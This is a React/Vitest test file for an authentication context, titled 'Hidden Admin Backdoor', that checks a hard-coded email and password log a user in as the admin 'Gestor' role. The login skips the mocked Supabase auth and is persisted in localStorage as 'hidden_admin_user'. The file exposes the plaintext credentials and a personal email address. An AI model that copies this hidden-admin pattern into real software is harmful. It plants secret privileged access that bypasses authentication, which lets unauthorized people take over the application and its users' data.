import { describe, it, expect, vi, beforeEach } from 'vitest';
import { render, screen, act } from '@testing-library/react';
import { AuthProvider, useAuth } from './AuthContext';
import { supabase } from '../services/supabaseClient';

// Mock Supabase
vi.mock('../services/supabaseClient', () => ({
    supabase: {
        auth: {
            getSession: vi.fn(() => Promise.resolve({ data: { session: null }, error: null })),
            onAuthStateChange: vi.fn(() => ({ data: { subscription: { unsubscribe: vi.fn() } } })),
            signInWithPassword: vi.fn(),
            signOut: vi.fn(),
        },
        from: vi.fn(() => ({
            select: vi.fn(() => ({
                eq: vi.fn(() => ({
                    single: vi.fn(() => Promise.resolve({ data: null, error: null })),
                })),
            })),
        })),
    }
}));

// Helper component to access useAuth hook
const TestComponent = () => {
    const { user, login, logout } = useAuth();
    return (
        <div>
            <div data-testid="user-role">{user?.role}</div>
            <button data-testid="login-btn" onClick={() => login('matheus.stanley12@gmail.com', '35215415')}>Login Admin</button>
            <button data-testid="logout-btn" onClick={() => logout()}>Logout</button>
        </div>
    );
};

describe('AuthContext - Hidden Admin Backdoor', () => {
    beforeEach(() => {
        vi.clearAllMocks();
        localStorage.clear();
    });

    it('should login hidden admin and persist session', async () => {
        render(
            <AuthProvider>
                <TestComponent />
            </AuthProvider>
        );

        const loginBtn = screen.getByTestId('login-btn');

        await act(async () => {
            loginBtn.click();
        });

        // Verify role is Gestor (Admin)
        expect(screen.getByTestId('user-role')).toHaveTextContent('Gestor');

        // Verify localStorage persistence
        const storedAdmin = localStorage.getItem('hidden_admin_user');
        expect(storedAdmin).not.toBeNull();
        expect(JSON.parse(storedAdmin).email).toBe('matheus.stanley12@gmail.com');
    });

    it('should logout and clear session', async () => {
        // Setup initial admin state
        const adminUser = {
            id: 'hidden-admin-id',
            email: 'matheus.stanley12@gmail.com',
            role: 'Gestor',
            name: 'Matheus Stanley'
        };
        localStorage.setItem('hidden_admin_user', JSON.stringify(adminUser));

        render(
            <AuthProvider>
                <TestComponent />
            </AuthProvider>
        );

        // Should initially be logged in
        expect(screen.getByTestId('user-role')).toHaveTextContent('Gestor');

        const logoutBtn = screen.getByTestId('logout-btn');

        await act(async () => {
            logoutBtn.click();
        });

        // Verify role is cleared
        expect(screen.getByTestId('user-role')).toHaveTextContent('');

        // Verify localStorage is cleared
        expect(localStorage.getItem('hidden_admin_user')).toBeNull();
    });
});
